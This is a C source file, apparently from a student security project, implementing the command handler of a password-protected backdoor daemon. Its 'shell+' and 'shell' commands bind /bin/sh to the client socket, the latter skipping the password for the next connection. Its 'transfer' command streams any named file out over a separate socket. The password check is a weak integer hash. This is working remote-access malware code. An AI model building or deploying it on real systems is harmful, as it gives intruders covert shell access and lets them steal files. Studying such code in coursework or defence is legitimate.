/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_hooks.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/07 14:10:36 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		int hashed_msg = hash_str(msg);
		if (hashed_msg == PASSWORD)
		{
			logger_log(LOG_LOG, "Client %d correct password (%d)", client->id, hashed_msg);
			server_send_to_id(&ctx->server, client->id, CORRECT_PASSWORD_TEXT);
			server_send_to_fd(client->fd, PROMPT);
			client->logged = true;
			return (0);
		}
		logger_log(LOG_LOG, "Client %d wrong password (%d)", client->id, hashed_msg);
		server_send_to_id(&ctx->server, client->id, INCORRECT_PASSWORD_TEXT);
		return (0);
	}
	return (1);
}

static size_t	get_active_shells(t_server *server)
{
	size_t	res;
	size_t	i;
	t_client	**clients;

	res = 0;
	i = 0;
	clients = list_to_array(&server->clients);
	if (!clients)
		return (0);
	while (i < server->clients.size)
	{
		if (clients[i]->shell_pid > 0)
			res++;
		i++;
	}
	free(clients);
	return (res);
}

static void	start_remote_shell(t_ctx *ctx, t_client *client)
{
	logger_log(LOG_LOG, "Client %d shell command entered", client->id);
	server_send_to_id(&ctx->server, client->id, RVRS_SHELL_TEXT);

	client->shell_pid = fork();
	if (client->shell_pid == 0)
	{
		setsid();

		dup2(client->fd, STDOUT_FILENO);
		dup2(client->fd, STDERR_FILENO);
		dup2(client->fd, STDIN_FILENO);
		close(client->fd);

		logger_log(LOG_INFO, "Sucessfully forked, spawning shell");
		ctx_delete(ctx, false);

		char	*argv[] = {"/bin/sh", NULL};
		execv("/bin/sh", argv);
		exit(0);
	}
}

static size_t	get_logged_users(t_server *server)
{
	size_t	res;
	size_t	i;
	t_client	**clients;

	res = 0;
	i = 0;
	clients = list_to_array(&server->clients);
	while (i < server->clients.size)
	{
		if (clients[i]->logged)
			res++;
		i++;
	}
	free(clients);
	return (res);
}

static void	get_stats(t_ctx *ctx, t_client *client)
{
	char	buf[4096];

	sprintf(buf, "Users connected to socket: %lu\n", ctx->server.clients.size);
	server_send_to_fd(client->fd, buf);
	
	sprintf(buf, "Logged users: %lu\n", get_logged_users(&ctx->server));
	server_send_to_fd(client->fd, buf);

	sprintf(buf, "Active shells: %lu\n", get_active_shells(&ctx->server));
	server_send_to_fd(client->fd, buf);

	sprintf(buf, "Bytes received %lu\n", ctx->server.total_bytes_received);
	server_send_to_fd(client->fd, buf);

	sprintf(buf, "Messages received %lu\n", ctx->server.messages_received);
	server_send_to_fd(client->fd, buf);
}

#include <sys/sendfile.h>
#include <sys/stat.h>

static int	transfer_file(int sock_fd, char *src_path)
{
	struct stat	file_stat;
	int		fdin;

	fdin = open(src_path, O_RDONLY);
	if (fdin == -1)
		return (0);
	fstat(fdin, &file_stat);

	dprintf(sock_fd, "transfer:%ld\n", file_stat.st_size);

	sleep(1);

	char 	buf[4096];
	ssize_t rdb;
	do
	{
		memset(buf, 0, sizeof(buf));
		rdb = read(fdin, buf, sizeof(buf));
		write(sock_fd, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	return (1);
}

int	server_remove_client(t_server *server, int fd);

int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
{
	(void)size;
	t_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return (1);

	logger_log(LOG_LOG, "From %d: %s", client->id, msg);

	if (!strcmp(msg, "shell"))
	{
		ctx->server.goofy_shell = true;
		if (ctx->server.disconnect_hook)
			ctx->server.disconnect_hook(client, ctx->server.disconnect_hook_arg);
		server_remove_client(&ctx->server, client->fd);
		return (0);
	}
	if (!strcmp(msg, "shell+"))
	{
		start_remote_shell(ctx, client);
		return (1);
	}
	else if (!strcmp(msg, "help"))
	{
		logger_log(LOG_LOG, "Client %d help command entered", client->id);
		server_send_to_id(&ctx->server, client->id, HELP_TEXT);
	}
	else if (!strcmp(msg, "quit"))
	{
		logger_log(LOG_LOG, "Client %d quit command entered", client->id);
		ctx->running = false;
		return (1);
	}
	else if (!strcmp(msg, "stats"))
	{
		logger_log(LOG_LOG, "Client %d stats command entered", client->id);
		get_stats(ctx, client);
	}
	else if (!strncmp(msg, "transfer", 8))
	{
		int	fd = get_sword_fd();
		if (*(msg + 7) && *(msg + 9))
		{
			if (!transfer_file(fd, msg + 9))
				server_send_to_fd(client->fd, TEXT_RED "Failed to transfer file.\n" TEXT_RESET);
		}
		logger_log(LOG_LOG, "Client %d transfer command entered", client->id);
		close(fd);
	}
	else
		server_send_to_id(&ctx->server, client->id, UNKNOWN_COMMAND_TEXT);
	server_send_to_fd(client->fd, PROMPT);
	return (1);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	logger_log(LOG_INFO, "Client %d joined", client->id);
	if (ctx->server.goofy_shell)
	{
		client->is_goofy_shell = true;
		start_remote_shell(ctx, client);
		ctx->server.goofy_shell = false;
		return ;
	}
	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	(void)ptr;
	logger_log(LOG_INFO, "Client %d left", client->id);
}
